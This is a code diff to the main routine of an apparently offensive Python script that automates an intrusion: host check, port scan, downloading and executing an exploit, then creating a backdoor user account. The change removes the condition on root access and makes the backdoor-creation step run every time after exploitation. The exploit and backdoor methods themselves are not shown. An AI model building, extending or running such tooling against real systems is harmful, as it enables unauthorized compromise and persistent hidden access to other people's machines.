@@ -203,7 +203,7 @@ def main():
         print("############################################################################")
         if ec.checkStatus() == 'up':
             print("The host {} is up!".format(ip))
-            print("Checkng host status finished!")
+            print("Checking host status finished!")
             
             print("############################################################################")
             print("#    3. Running full-open scan on the target...")
@@ -236,16 +236,13 @@ def main():
                     print("#    6. Downloading and executing the exploit...")
                     print("############################################################################")
                     ec.sendCommand()
-                    priv_esc = ec.exploitTarget()
-                    print(priv_esc)
-                    # if priv_esc == 'root':
-                    #     print("############################################################################")
-                    #     print("#    7. Creating user backdoor...")
-                    #     print("############################################################################")
-                    #     ec.createUser()
-                    #     pass
-                    # else:
-                    #     pass
+                    ec.exploitTarget()
+                    
+                    print("############################################################################")
+                    print("#    7. Creating user backdoor...")
+                    print("############################################################################")
+                    ec.createUser()
+
                 else:
                     print("Target can not be exploited!")
                     pass
